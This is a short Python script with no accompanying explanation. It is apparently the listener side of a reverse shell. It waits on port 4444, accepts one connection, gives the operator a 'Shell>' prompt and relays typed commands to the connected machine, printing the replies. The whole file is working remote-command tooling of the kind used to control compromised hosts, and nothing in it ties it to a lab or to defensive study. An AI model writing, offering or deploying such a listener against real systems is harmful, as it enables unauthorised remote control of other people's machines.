import socket

def start_server(host: str = "0.0.0.0", port: int = 4444) -> None:
    """
    Start a server to listen for incoming connections and handle commands.
    """
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
            server.bind((host, port))
            server.listen(1)
            print(f"[*] Listening on {host}:{port}")

            client, addr = server.accept()
            print(f"[+] Connection from {addr}")

            with client:
                while True:
                    try:
                        command = input("Shell> ").strip()

                        if not command:
                            print("[!] Please enter a valid command.")
                            continue

                        if command.lower() == "exit":
                            print("[*] Closing connection.")
                            break

                        client.send(command.encode())

                        response = client.recv(1024).decode()
                        if not response:
                            print("[-] Client disconnected.")
                            break

                        print(response)

                    except KeyboardInterrupt:
                        print("\n[*] Server shutdown by user.")
                        break
                    except Exception as e:
                        print(f"[-] Error: {e}")
                        break

    except Exception as e:
        print(f"[-] Server error: {e}")

if __name__ == "__main__":
    start_server()